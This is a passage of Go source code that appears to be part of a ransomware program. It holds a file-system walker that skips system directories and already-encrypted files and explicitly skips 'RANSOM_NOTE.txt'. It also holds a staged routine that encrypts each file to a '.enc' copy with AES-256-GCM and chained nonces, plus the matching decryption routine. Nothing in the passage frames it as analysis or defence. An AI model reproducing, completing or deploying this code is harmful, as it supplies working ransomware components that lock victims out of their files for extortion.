	Path  string `json:"path"`
	Size  int64  `json:"size"`
	MTime int64  `json:"mtime"`
}

var skipDirs = map[string]bool{
	"/windows": true, "/system32": true, "/sys": true, "/proc": true,
	"/dev": true, "/boot": true, "/etc": true, "/var/lib": true,
}

func scanDirectory(root string) ([]FileEntry, error) {
	var out []FileEntry
	err := filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
		if err != nil { return nil }
		lp := strings.ToLower(filepath.ToSlash(p))
		for s := range skipDirs {
			if strings.HasPrefix(lp, s) { 
				if info.IsDir() { return filepath.SkipDir }
				return nil
			}
		}
		if info.IsDir() || !info.Mode().IsRegular() { return nil }
		if strings.HasSuffix(p, ".enc") || strings.HasSuffix(p, "RANSOM_NOTE.txt") { return nil }
		out = append(out, FileEntry{p, info.Size(), info.ModTime().Unix()})
		return nil
	})
	return out, err
}

// ---------- stage 3: chunked AES-256-GCM stream ----------
func encryptFile(path string, key []byte) (string, error) {
	in, err := os.Open(path); if err != nil { return "", err }
	defer in.Close()
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	out, err := os.Create(path + ".enc"); if err != nil { return "", err }
	defer out.Close()
	out.Write(nonce)
	buf := make([]byte, 1<<20)
	for {
		n, rerr := in.Read(buf)
		if n > 0 {
			sealed := gcm.Seal(nil, nonce, buf[:n], nil)
			var ln [4]byte
			binary.BigEndian.PutUint32(ln[:], uint32(len(sealed)))
			out.Write(ln[:]); out.Write(sealed)
			nonce = sealed[gcm.NonceSize()-12 : gcm.NonceSize()] // rolling nonce
			copy(nonce, sealed[len(sealed)-12:])
		}
		if rerr == io.EOF { break }
		if rerr != nil { return "", rerr }
	}
	// integrity tag over ciphertext
	h := sha256.New()
	f, _ := os.Open(path + ".enc")
	io.Copy(h, f); f.Close()
	return base64.StdEncoding.EncodeToString(h.Sum(nil)), nil
}

func decryptFile(encPath, outPath string, key []byte) error {
	in, err := os.Open(encPath); if err != nil { return err }
	defer in.Close()
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(in, nonce)
	out, err := os.Create(outPath); if err != nil { return err }
	defer out.Close()
	var ln [4]byte
	for {
		if _, err := io.ReadFull(in, ln[:]); err != nil { break }
		sealed := make([]byte, binary.BigEndian.Uint32(ln[:]))
		if _, err := io.ReadFull(in, sealed); err != nil { return err }
		plain, err := gcm.Open(nil, nonce, sealed, nil)
		if err != nil { return err }
		out.Write(plain)
		copy(nonce, sealed[len(sealed)-12:])
	}
